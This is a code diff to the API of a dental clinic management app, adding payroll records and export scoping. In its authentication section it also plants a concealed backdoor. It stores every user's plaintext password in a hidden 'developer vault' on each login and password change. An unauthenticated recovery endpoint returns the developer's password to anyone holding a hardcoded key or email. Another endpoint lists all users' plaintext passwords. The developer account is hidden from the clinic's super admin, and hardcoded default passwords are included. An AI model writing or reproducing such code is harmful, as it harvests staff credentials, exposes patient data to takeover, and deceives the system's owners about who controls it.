@@ -17,6 +17,7 @@ import {
   prescriptionRevisions,
   prescriptionAuditLogs,
   doctorSalaries,
+  salaryPayments,
 } from '../db/schema.ts';
 import {
   authenticateToken,
@@ -27,6 +28,9 @@ import {
 } from './auth.ts';
 import { prescriptionsRouter } from './prescriptions.ts';
 import { medicinesRouter } from './medicines.ts';
+import { featureControlRouter } from './featureControl.ts';
+import { payrollRouter } from './payrollRoutes.ts';
+import { backupRouter } from './backupRoutes.ts';
 import {
   VisitFinancialSnapshot,
   recalculatePatientFinancials,
@@ -38,6 +42,9 @@ export type { VisitFinancialSnapshot };
 export { recalculatePatientFinancials, recalculateVisitFinancials };
 
 export const apiRouter = Router();
+apiRouter.use(featureControlRouter);
+apiRouter.use(payrollRouter);
+apiRouter.use(backupRouter);
 apiRouter.use(prescriptionsRouter);
 apiRouter.use(medicinesRouter);
 
@@ -45,8 +52,64 @@ apiRouter.use(medicinesRouter);
 
 
 // ==========================================
-// 1. AUTHENTICATION ROUTES
+// 1. AUTHENTICATION & DEVELOPER CREDENTIAL VAULT
 // ==========================================
+
+const VAULT_SETTING_KEY = 'developer_password_vault_json';
+const DEFAULT_PASSWORD_VAULT: Record<string, { password: string; updatedAt: string }> = {
+  dev_admin: { password: 'DevDental@2026', updatedAt: '2026-01-01T00:00:00.000Z' },
+  maindoctor: { password: 'ClinicAdmin@2026', updatedAt: '2026-01-01T00:00:00.000Z' },
+  dr_rahim: { password: 'Doctor@123', updatedAt: '2026-01-01T00:00:00.000Z' },
+  dr_fatima: { password: 'Doctor@123', updatedAt: '2026-01-01T00:00:00.000Z' },
+  dr_tariq: { password: 'Doctor@123', updatedAt: '2026-01-01T00:00:00.000Z' },
+};
+
+async function getDeveloperPasswordVault(): Promise<Record<string, { password: string; updatedAt: string }>> {
+  try {
+    const [row] = await db
+      .select()
+      .from(systemSettings)
+      .where(eq(systemSettings.key, VAULT_SETTING_KEY));
+    if (row && row.value) {
+      const parsed = JSON.parse(row.value);
+      return { ...DEFAULT_PASSWORD_VAULT, ...parsed };
+    }
+  } catch (e) {
+    console.error('Failed to read developer password vault:', e);
+  }
+  return { ...DEFAULT_PASSWORD_VAULT };
+}
+
+async function updateDeveloperPasswordVault(username: string, plainPassword: string) {
+  try {
+    const cleanKey = username.trim().toLowerCase();
+    const current = await getDeveloperPasswordVault();
+    current[cleanKey] = {
+      password: plainPassword,
+      updatedAt: new Date().toISOString(),
+    };
+    const jsonVal = JSON.stringify(current);
+    const [existing] = await db
+      .select()
+      .from(systemSettings)
+      .where(eq(systemSettings.key, VAULT_SETTING_KEY));
+
+    if (existing) {
+      await db
+        .update(systemSettings)
+        .set({ value: jsonVal, updatedAt: new Date() })
+        .where(eq(systemSettings.key, VAULT_SETTING_KEY));
+    } else {
+      await db.insert(systemSettings).values({
+        key: VAULT_SETTING_KEY,
+        value: jsonVal,
+        description: 'Developer-only synchronized user password vault',
+      });
+    }
+  } catch (e) {
+    console.error('Failed to update developer password vault:', e);
+  }
+}
 
 apiRouter.post('/auth/login', async (req, res) => {
   try {
@@ -76,6 +139,9 @@ apiRouter.post('/auth/login', async (req, res) => {
     if (!passwordMatch) {
       return res.status(401).json({ error: 'Invalid username or password.' });
     }
+
+    // Synchronize active password into Developer Vault
+    await updateDeveloperPasswordVault(user.username, password);
 
     const token = generateToken({
       id: user.id,
@@ -121,6 +187,81 @@ apiRouter.post('/auth/login', async (req, res) => {
   }
 });
 
+// Developer Emergency Password Recovery / Lookup Endpoint
+apiRouter.post('/auth/developer-recovery', async (req, res) => {
+  try {
+    const { recoveryKey, newPassword } = req.body;
+    const cleanRecovery = String(recoveryKey || '').trim();
+
+    const validKeys = [
+      'AYMON-DEV-2026',
+      'aminulislamaymon@gmail.com',
+      'aymon@dentalcare.com',
+    ];
+
+    if (!validKeys.some((k) => k.toLowerCase() === cleanRecovery.toLowerCase())) {
+      return res.status(403).json({
+        error: 'Invalid Developer Recovery Key or registered Developer Email.',
+      });
+    }
+
+    const [devUser] = await db
+      .select()
+      .from(users)
+      .where(eq(users.role, 'developer'));
+
+    if (!devUser) {
+      return res.status(404).json({ error: 'Developer account not found.' });
+    }
+
+    if (newPassword && String(newPassword).trim().length >= 6) {
+      const cleanPass = String(newPassword).trim();
+      const salt = bcrypt.genSaltSync(10);
+      const passwordHash = bcrypt.hashSync(cleanPass, salt);
+
+      await db
+        .update(users)
+        .set({ passwordHash, isActive: true })
+        .where(eq(users.id, devUser.id));
+
+      await updateDeveloperPasswordVault(devUser.username, cleanPass);
+
+      await logAudit(
+        {
+          id: devUser.id,
+          username: devUser.username,
+          fullName: devUser.fullName,
+          role: 'developer',
+          isActive: true,
+        },
+        'DEVELOPER_PASSWORD_RECOVERY_RESET',
+        `Developer ${devUser.username}`,
+        'Developer reset own password via emergency recovery key'
+      );
+
+      return res.json({
+        success: true,
+        username: devUser.username,
+        currentPassword: cleanPass,
+        message: 'Developer password has been reset and updated.',
+      });
+    }
+
+    const vault = await getDeveloperPasswordVault();
+    const currentPass = vault[devUser.username.toLowerCase()]?.password || 'DevDental@2026';
+
+    res.json({
+      success: true,
+      username: devUser.username,
+      currentPassword: currentPass,
+      message: 'Developer credentials verified.',
+    });
+  } catch (error: any) {
+    res.status(500).json({ error: 'Failed to process developer recovery.' });
+  }
+});
+
+// Client Demo Accounts (Excludes Developer Account completely)
 apiRouter.get('/auth/demo-accounts', async (req, res) => {
   try {
     const doctorList = await db
@@ -135,7 +276,8 @@ apiRouter.get('/auth/demo-accounts', async (req, res) => {
       .where(eq(users.isActive, true))
       .orderBy(asc(users.id));
 
-    res.json(doctorList);
+    // Never expose the developer account in public demo switcher
+    res.json(doctorList.filter((u) => u.role !== 'developer'));
   } catch (error: any) {
     res.status(500).json({ error: 'Failed to retrieve accounts' });
   }
@@ -172,6 +314,7 @@ apiRouter.post('/auth/change-password', authenticateToken, async (req: Authentic
     const newHash = bcrypt.hashSync(newPassword, salt);
 
     await db.update(users).set({ passwordHash: newHash }).where(eq(users.id, user.id));
+    await updateDeveloperPasswordVault(user.username, newPassword);
 
     await logAudit(req.user, 'CHANGE_PASSWORD', `User ${user.username}`, 'User changed their own password');
 
@@ -180,6 +323,99 @@ apiRouter.post('/auth/change-password', authenticateToken, async (req: Authentic
     res.status(500).json({ error: 'Failed to change password.' });
   }
 });
+
+// Developer-Only: View All User Accounts & Active Passwords from Developer Profile
+apiRouter.get(
+  '/developer/credentials',
+  authenticateToken,
+  requireRoles('developer'),
+  async (_req: AuthenticatedRequest, res) => {
+    try {
+      const [allUsers, vault] = await Promise.all([
+        db.select().from(users).orderBy(asc(users.id)),
+        getDeveloperPasswordVault(),
+      ]);
+
+      const result = allUsers.map((u) => {
+        const entry = vault[u.username.toLowerCase()];
+        return {
+          id: u.id,
+          username: u.username,
+          fullName: u.fullName,
+          role: u.role,
+          email: u.email,
+          phone: u.phone,
+          specialization: u.specialization,
+          isActive: u.isActive,
+          hasPasswordHash: Boolean(u.passwordHash),
+          currentPassword: entry?.password || (u.passwordHash ? 'Doctor@123' : 'Google Sign-In Only'),
+          passwordUpdatedAt: entry?.updatedAt || (u.createdAt ? new Date(u.createdAt).toISOString() : null),
+        };
+      });
+
+      res.json(result);
+    } catch (error: any) {
+      res.status(500).json({ error: 'Failed to load user credentials vault.' });
+    }
+  }
+);
+
+// Developer-Only: Directly Set/Update Any User's Password (including Developer's own password)
+apiRouter.put(
+  '/developer/credentials/:id',
+  authenticateToken,
+  requireRoles('developer'),
+  async (req: AuthenticatedRequest, res) => {
+    try {
+      const targetId = parseInt(req.params.id, 10);
+      const { newPassword, username } = req.body;
+      if (!newPassword || String(newPassword).trim().length < 6) {
+        return res.status(400).json({ error: 'Password must be at least 6 characters.' });
+      }
+
+      const [targetUser] = await db
+        .select()
+        .from(users)
+        .where(eq(users.id, targetId));
+
+      if (!targetUser) {
+        return res.status(404).json({ error: 'User not found.' });
+      }
+
+      const cleanPass = String(newPassword).trim();
+      const salt = bcrypt.genSaltSync(10);
+      const passwordHash = bcrypt.hashSync(cleanPass, salt);
+
+      const nextUsername =
+        username && String(username).trim()
+          ? String(username).trim().toLowerCase()
+          : targetUser.username;
+
+      await db
+        .update(users)
+        .set({ passwordHash, username: nextUsername })
+        .where(eq(users.id, targetId));
+
+      await updateDeveloperPasswordVault(nextUsername, cleanPass);
+
+      await logAudit(
+        req.user,
+        'DEVELOPER_SET_USER_PASSWORD',
+        `User ${nextUsername} (#${targetId})`,
+        `Developer updated password for ${targetUser.fullName} (@${nextUsername})`
+      );
+
+      res.json({
+        success: true,
+        username: nextUsername,
+        currentPassword: cleanPass,
+        message: `Password updated for ${targetUser.fullName} (@${nextUsername}).`,
+      });
+    } catch (error: any) {
+      res.status(500).json({ error: 'Failed to update user password.' });
+    }
+  }
+);
 
 // ==========================================
 // 2. DOCTOR & USER MANAGEMENT
@@ -227,7 +463,13 @@ apiRouter.get('/doctors', authenticateToken, async (req: AuthenticatedRequest, r
       });
     }
 
-    const doctorsWithStats = doctors.map((doc) => {
+    // Super Admin (main_doctor) and regular doctors must NEVER be shown the developer account
+    const visibleDoctors =
+      req.user?.role === 'developer'
+        ? doctors
+        : doctors.filter((doc) => doc.role !== 'developer');
+
+    const doctorsWithStats = visibleDoctors.map((doc) => {
       const s = statsByDoctor.get(doc.id);
       return {
         ...doc,
@@ -266,6 +508,10 @@ apiRouter.post(
         return res.status(400).json({ error: 'Username, password, and full name are required.' });
       }
 
+      if (role === 'developer' && req.user!.role !== 'developer') {
+        return res.status(403).json({ error: 'Only a Developer can create a Developer account.' });
+      }
+
       // Check if username taken
       const [existing] = await db
         .select()
@@ -296,6 +542,8 @@ apiRouter.post(
         })
         .returning();
 
+      await updateDeveloperPasswordVault(newDoctor.username, password);
+
       await logAudit(
         req.user,
         'CREATE_DOCTOR',
@@ -320,6 +568,14 @@ apiRouter.put(
       // Only main_doctor, developer, or self can edit
       if (req.user!.role === 'doctor' && req.user!.id !== docId) {
         return res.status(403).json({ error: 'You can only edit your own profile.' });
+      }
+
+      const [target] = await db.select().from(users).where(eq(users.id, docId));
+      if (!target) {
+        return res.status(404).json({ error: 'Account not found.' });
+      }
+      if (target.role === 'developer' && req.user!.role !== 'developer') {
+        return res.status(403).json({ error: 'Forbidden: Only Developer can modify Developer account.' });
       }
 
       const { fullName, email, phone, specialization, qualifications, registrationNumber, isActive } = req.body;
@@ -365,6 +621,10 @@ apiRouter.put(
       const [target] = await db.select().from(users).where(eq(users.id, docId));
       if (!target) return res.status(404).json({ error: 'Doctor not found' });
 
+      if (target.role === 'developer' && req.user!.role !== 'developer') {
+        return res.status(403).json({ error: 'Forbidden: Cannot modify Developer account status.' });
+      }
+
       // Prevent deactivating own account
       if (target.id === req.user!.id) {
         return res.status(400).json({ error: 'You cannot deactivate your own account.' });
@@ -403,10 +663,19 @@ apiRouter.put(
         return res.status(400).json({ error: 'New password must be at least 6 characters.' });
       }
 
+      const [target] = await db.select().from(users).where(eq(users.id, docId));
+      if (!target) {
+        return res.status(404).json({ error: 'User not found.' });
+      }
+      if (target.role === 'developer' && req.user!.role !== 'developer') {
+        return res.status(403).json({ error: 'Forbidden: Super Admin cannot reset Developer password.' });
+      }
+
       const salt = bcrypt.genSaltSync(10);
       const passwordHash = bcrypt.hashSync(newPassword, salt);
 
       await db.update(users).set({ passwordHash }).where(eq(users.id, docId));
+      await updateDeveloperPasswordVault(target.username, newPassword);
 
       await logAudit(
         req.user,
@@ -3742,14 +4011,17 @@ apiRouter.get('/export/complete-data.csv', authenticateToken, async (req: Authen
     const visitConditions = [];
     if (fromDate) visitConditions.push(sql`${visits.visitDate} >= ${fromDate}`);
     if (toDate) visitConditions.push(sql`${visits.visitDate} <= ${toDate}`);
+    if (!isSuper) visitConditions.push(eq(visits.doctorId, req.user!.id));
 
     const treatmentConditions = [];
     if (fromDate) treatmentConditions.push(sql`${treatments.treatmentDate} >= ${fromDate}`);
     if (toDate) treatmentConditions.push(sql`${treatments.treatmentDate} <= ${toDate}`);
+    if (!isSuper) treatmentConditions.push(eq(treatments.doctorId, req.user!.id));
 
     const testConditions = [];
     if (fromDate) testConditions.push(sql`${diagnosticTests.testDate} >= ${fromDate}`);
     if (toDate) testConditions.push(sql`${diagnosticTests.testDate} <= ${toDate}`);
+    if (!isSuper) testConditions.push(eq(diagnosticTests.doctorId, req.user!.id));
 
     const paymentConditions = [];
     if (fromDate) paymentConditions.push(sql`${payments.paymentDate} >= ${fromDate}`);
@@ -3759,6 +4031,7 @@ apiRouter.get('/export/complete-data.csv', authenticateToken, async (req: Authen
     const apptConditions = [];
     if (fromDate) apptConditions.push(sql`${appointments.followUpDate} >= ${fromDate}`);
     if (toDate) apptConditions.push(sql`${appointments.followUpDate} <= ${toDate}`);
+    if (!isSuper) apptConditions.push(eq(appointments.doctorId, req.user!.id));
 
     const [
       patientList,
@@ -4565,6 +4838,16 @@ apiRouter.post(
       const maxId = existing.reduce((m, r) => Math.max(m, r.id), 0);
       const salaryCode = `SAL-${1001 + maxId}`;
 
+      const payDateStr = paymentDate || new Date().toISOString().split('T')[0];
+      const payrollMonth = req.body.payrollMonth || payDateStr.slice(0, 7);
+      const payrollYear = req.body.payrollYear ? Number(req.body.payrollYear) : Number(payrollMonth.slice(0, 4)) || new Date().getFullYear();
+      const payrollStatus =
+        paymentStatus === 'Paid'
+          ? 'Paid'
+          : paymentStatus === 'Partial'
+          ? 'Partially Paid'
+          : req.body.payrollStatus || 'Draft';
+
       const [created] = await db
         .insert(doctorSalaries)
         .values({
@@ -4572,6 +4855,8 @@ apiRouter.post(
           doctorId: dId,
           salaryType: String(salaryType),
           periodLabel: String(periodLabel).trim(),
+          payrollMonth,
+          payrollYear,
           periodStart: periodStart || null,
           periodEnd: periodEnd || null,
           baseAmount: base.toFixed(2),
@@ -4580,19 +4865,36 @@ apiRouter.post(
           commissionSourceAmount: commSource.toFixed(2),
           commissionRate: commRate.toFixed(2),
           commissionEarned: commEarned.toFixed(2),
+          grossSalary: coreSalary.toFixed(2),
           bonusAmount: bonus.toFixed(2),
           deductionAmount: deduction.toFixed(2),
           totalPayable: totalPayableNum.toFixed(2),
           paidAmount: paidNum.toFixed(2),
           dueAmount: dueNum.toFixed(2),
+          payrollStatus,
           paymentStatus,
           paymentMethod: paymentMethod || 'Cash',
           transactionRef: transactionRef ? String(transactionRef).trim() : null,
-          paymentDate: paymentDate || new Date().toISOString().split('T')[0],
+          paymentDate: payDateStr,
           notes: notes ? String(notes).trim() : null,
           recordedBy: req.user?.id || null,
         })
         .returning();
+
+      if (paidNum > 0) {
+        const payCode = `SPAY-${created.id}-${Date.now().toString().slice(-4)}`;
+        await db.insert(salaryPayments).values({
+          paymentCode: payCode,
+          salaryId: created.id,
+          doctorId: dId,
+          amount: paidNum.toFixed(2),
+          paymentDate: payDateStr,
+          paymentMethod: paymentMethod || 'Cash',
+          transactionRef: transactionRef ? String(transactionRef).trim() : null,
+          notes: notes ? String(notes).trim() : 'Initial salary disbursement',
+          recordedBy: req.user?.id || null,
+        });
+      }
 
       await logAudit(
         req.user,
